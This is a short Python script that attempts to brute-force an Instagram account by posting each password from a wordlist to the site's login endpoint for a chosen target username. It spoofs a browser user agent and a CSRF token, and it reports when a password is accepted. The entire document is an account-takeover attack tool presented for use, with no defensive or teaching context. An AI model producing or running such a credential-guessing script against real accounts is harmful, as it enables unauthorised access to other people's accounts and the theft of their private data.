import requests

# Login URL
url = "https://www.instagram.com/accounts/login/ajax/"

# Headers for the request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-CSRFToken": "your_csrf_token_here"
}

# Target account username
target_username = "target_username_here"

# Load password list
def load_passwords(file_path):
    with open(file_path, "r") as file:
        return file.readlines()

# Attempt brute force login
def brute_force_login(username, password_list):
    for password in password_list:
        payload = {
            "username": username,
            "password": password.strip()
        }
        response = requests.post(url, headers=headers, data=payload)
        if response.status_code == 200 and "authenticated" in response.text:
            print(f"[+] Password found: {password}")
            return
        else:
            print(f"[-] Failed attempt with password: {password}")
    print("[!] No valid password found.")

# Main execution
password_file = "passwords.txt"
passwords = load_passwords(password_file)
brute_force_login(target_username, passwords)
